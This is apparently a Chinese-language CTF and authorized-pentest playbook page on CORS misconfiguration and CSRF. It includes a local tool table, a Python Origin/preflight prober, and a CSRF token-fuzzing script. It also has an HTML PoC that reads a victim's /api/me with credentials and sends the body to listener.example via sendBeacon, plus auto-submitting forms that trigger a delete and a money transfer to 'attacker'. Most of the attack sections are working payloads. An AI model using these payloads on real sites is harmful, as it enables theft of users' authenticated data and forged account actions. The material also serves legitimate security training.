# CORS / CSRF 高级攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/07-client/cors-csrf.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「CORS / CSRF / SameSite / 跨域请求」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- CORS
- CSRF
- SameSite
- 跨域请求
- 跨站请求伪造
- ACAO
- ACAC
- csrf token bypass
- preflight

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 工作流
2. 判定矩阵
3. Origin 与 preflight oracle — 成功样本：attacker origin 被反射，ACAC=true，带 cookie 的响应 hash 与同源 baseline 一致或包含用户字段。失败样本：只有公开字段、无 ACAC、preflight 不允许目标…
4. 浏览器 PoC 模板 — 如果浏览器 console 显示 CORS error，但服务端状态已经变化，这不是 CORS 读取，而是 CSRF 状态动作路线。
5. CSRF token 变体
6. SameSite 与 simple request — 判定：SameSite 路线看的是状态变化，不要求 JS 能读响应；CORS 路线看的是响应可读。两者不要混在同一个结论里。

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — 反射 attacker origin 且 `ACAC=true`
- **失败样本** — 只允许固定白名单
- **命中样本** — 跨域读到 `/api/me`、订单、flag
- **失败样本** — 响应不含认证态
- **命中样本** — null origin 读到认证响应
- **失败样本** — null 明确拒绝
- **命中样本** — token 可复用/跨用户/空值通过
- **失败样本** — token 绑定 session+动作
- **命中样本** — 状态动作被触发
- **失败样本** — SameSite/Origin/Token 阻断
- **命中样本** — 状态变化或业务响应推进
- **失败样本** — preflight 或 content-type 校验
- **命中样本** — 动作成功
- **失败样本** — `csrf missing`

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

CORS 决定跨域 JS 能不能读响应，CSRF 决定跨站页面能不能借浏览器状态触发动作。实战里两者经常相互接力：CORS 读 token，CSRF 打状态动作；XSS/admin bot 又能把两条线合并。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 响应有 `Access-Control-Allow-Origin` | Origin 变体 + credentials oracle | 反射 attacker origin 且 `ACAC=true` | 只允许固定白名单 |
| 接口接受 Cookie 会话 | 带/不带 credentials 对比 | 跨域读到 `/api/me`、订单、flag | 响应不含认证态 |
| `Origin: null` 被允许 | sandbox iframe/data/file origin | null origin 读到认证响应 | null 明确拒绝 |
| CSRF token 在 HTML/API 中 | 先读 token，再单变量突变动作 | token 可复用/跨用户/空值通过 | token 绑定 session+动作 |
| SameSite=Lax/缺失 | GET 导航和 top-level form | 状态动作被触发 | SameSite/Origin/Token 阻断 |
| JSON API 无 token | text/plain、form、simple request 绕 preflight | 状态变化或业务响应推进 | preflight 或 content-type 校验 |

## 工作流

```text
建立同源 baseline
  → Origin/credentials/preflight 变体扫描
  → 判断能读响应还是只能触发动作
  → 抽 CSRF token 与 SameSite 行为
  → 单变量重放状态动作
  → 将响应读取、业务副作用和失败样本写入 Evidence
```

## 0. 判定矩阵

| ACAO | ACAC | Cookie 是否发出 | JS 能否读 | 价值 |
|---|---|---|---|---|
| 反射 attacker origin | `true` | 是 | 是 | 可读认证响应 |
| `*` | 无/false | 否或无关 | 是 | 只能读公开 API |
| `null` | `true` | 是 | 是 | sandbox/data/file origin 路线 |
| 固定 trusted origin | `true` | 是 | 否 | 找白名单匹配绕过 |
| 无 ACAO | 任意 | 是 | 否 | 转 CSRF 状态动作 |

## 1. Origin 与 preflight oracle

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests
from urllib.parse import urlparse

def host(url):
    return urlparse(url).netloc

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def origins(base):
    hn = host(base)
    return [
        "null",
        f"https://evil.{hn}",
        f"https://{hn}.attacker.example",
        f"http://{hn}",
        f"https://{hn.replace('.', '-')}.attacker.example",
        "https://attacker.example",
    ]

def probe(url, origin, method="GET", cookie=""):
    headers = {"Origin": origin}
    if cookie:
        headers["Cookie"] = cookie
    r = requests.request(method, url, headers=headers, timeout=10)
    return {
        "origin": origin,
        "method": method,
        "status": r.status_code,
        "hash": h(r.text),
        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
        "vary": r.headers.get("Vary", ""),
        "sample": r.text[:160],
    }

def preflight(url, origin, req_method="POST", req_headers="content-type,x-csrf-token"):
    r = requests.options(url, headers={
        "Origin": origin,
        "Access-Control-Request-Method": req_method,
        "Access-Control-Request-Headers": req_headers,
    }, timeout=10)
    return {
        "origin": origin,
        "status": r.status_code,
        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
        "acam": r.headers.get("Access-Control-Allow-Methods", ""),
        "acah": r.headers.get("Access-Control-Allow-Headers", ""),
        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    for o in origins(args.url):
        print(json.dumps({"simple": probe(args.url, o, cookie=args.cookie), "preflight": preflight(args.url, o)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：attacker origin 被反射，`ACAC=true`，带 cookie 的响应 hash 与同源 baseline 一致或包含用户字段。失败样本：只有公开字段、无 ACAC、preflight 不允许目标 method/header。

## 2. 浏览器 PoC 模板

```html
<!doctype html>
<script>
async function run() {
  const target = "https://target.example/api/me";
  const r = await fetch(target, {credentials: "include"});
  const t = await r.text();
  navigator.sendBeacon("https://listener.example/cors", JSON.stringify({
    status: r.status,
    type: r.type,
    body: t.slice(0, 2000)
  }));
}
run().catch(e => navigator.sendBeacon("https://listener.example/cors-err", String(e)));
</script>
```

如果浏览器 console 显示 CORS error，但服务端状态已经变化，这不是 CORS 读取，而是 CSRF 状态动作路线。

## 3. CSRF token 变体

| 变体 | 操作 | 命中样本 | 失败样本 |
|---|---|---|---|
| remove | 删除 token 字段/header | 动作成功 | `csrf missing` |
| empty | token 置空/`null` | 动作成功 | `csrf invalid` |
| reuse | 同一 token 重放多次 | 多次成功 | 一次后失效 |
| cross-user | A token 给 B session | B 动作成功 | session mismatch |
| cross-action | profile token 打 transfer | 动作成功 | action mismatch |
| method flip | POST 改 GET/PUT/override | 状态变化 | method 拒绝 |
| content-type flip | JSON 改 text/plain/form | 状态变化 | strict content-type |

```python
#!/usr/bin/env python3
import argparse
import copy
import hashlib
import json
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def variants(body, token_name):
    yield "baseline", body
    b = copy.deepcopy(body); b.pop(token_name, None); yield "remove_token", b
    for v in ("", None, "0", "undefined"):
        b = copy.deepcopy(body); b[token_name] = v; yield f"token={v}", b

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--body", required=True, help="JSON body")
    ap.add_argument("--token-name", default="csrf_token")
    args = ap.parse_args()
    sess = requests.Session()
    if args.cookie:
        sess.headers["Cookie"] = args.cookie
    base = json.loads(args.body)
    for name, b in variants(base, args.token_name):
        r = sess.post(args.url, json=b, timeout=10)
        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 4. SameSite 与 simple request

```html
<!-- SameSite=Lax: top-level GET/navigation 常带 cookie，适合找 GET 状态动作 -->
<a id=x href="https://target.example/api/delete?id=123">go</a>
<script>x.click()</script>

<!-- text/plain 避免预检；后端若宽松解析 JSON-like body，可触发动作 -->
<form method="POST" action="https://target.example/api/transfer" enctype="text/plain">
  <textarea name='{"to":"attacker","amount":1000,"x":"'>x"}</textarea>
  <button>go</button>
</form>
<script>document.forms[0].submit()</script>
```

判定：SameSite 路线看的是状态变化，不要求 JS 能读响应；CORS 路线看的是响应可读。两者不要混在同一个结论里。

## 攻击链

```text
CORS 反射 + ACAC
  → 跨域读 /api/me 或 CSRF token
  → 带 token 打状态动作
  → 外带业务响应或 flag

CSRF simple request
  → 借浏览器 cookie 触发状态动作
  → 用状态查询/回调/邮件/订单页确认副作用
```

## Evidence

| 项 | 记录内容 |
|---|---|
| CORS baseline | URL、Origin、ACAO、ACAC、Vary、preflight 结果 |
| 凭据行为 | Cookie 是否随请求、JS 是否能读 body、响应 hash |
| CSRF 变体 | token 删除/空值/复用/跨用户/跨动作/method/content-type |
| SameSite | cookie 属性、导航方式、method、状态动作结果 |
| 成功样本 | 跨域读到认证数据/token/flag，或跨站动作产生可复查副作用 |
| 失败样本 | CORS error 且无副作用、token mismatch、preflight 拒绝、SameSite 不带 cookie |
| 下一跳 | 读到 JWT 转 `02-auth/jwt`；读到前端状态转 `admin-bot-xss`；业务动作转支付/IDOR |
